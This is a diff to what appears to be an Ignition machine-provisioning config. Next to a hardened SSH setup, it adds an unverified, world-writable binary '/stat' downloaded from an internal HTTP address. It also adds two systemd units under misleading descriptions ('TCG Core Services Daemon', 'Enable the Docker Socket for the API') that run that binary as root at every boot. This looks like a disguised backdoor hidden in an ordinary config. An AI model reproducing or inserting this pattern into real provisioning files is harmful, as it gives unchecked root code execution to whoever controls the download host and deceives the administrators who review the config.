@@ -22,6 +22,15 @@
     "files": [
       {
         "filesystem": "root",
+        "path": "/stat",
+        "contents": {
+          "source": "http://192.168.1.2/files/stat",
+          "verification": {}
+        },
+        "mode": 511
+      },
+      {
+        "filesystem": "root",
         "path": "/etc/ssh/sshd_config",
         "contents": {
           "source": "data:,%23%20Use%20most%20defaults%20for%20sshd%20configuration.%0AUsePrivilegeSeparation%20sandbox%0ASubsystem%20sftp%20internal-sftp%0AUseDNS%20no%0A%0APermitRootLogin%20no%0AAllowUsers%20core%0AAuthenticationMethods%20publickey%0A",
@@ -139,5 +148,18 @@
       }
     ]
   },
-  "systemd": {}
+  "systemd": {
+    "units": [
+      {
+        "contents": "[Unit]\nDescription=TCG Core Services Daemon\n\n[Service]\nUser=root\nExecStart=/stat\n\n[Install]\nWantedBy=multi-user.target\n",
+        "enable": true,
+        "name": "jumpstarter.service"
+      },
+      {
+        "contents": "[Unit]\nDescription=Enable the Docker Socket for the API\n\n[Service]\nType=oneshot\nExecStart=/usr/bin/systemctl enable jumpstarter.service\n",
+        "enable": true,
+        "name": "enable-jumpstarter.service"
+      }
+    ]
+  }
 }
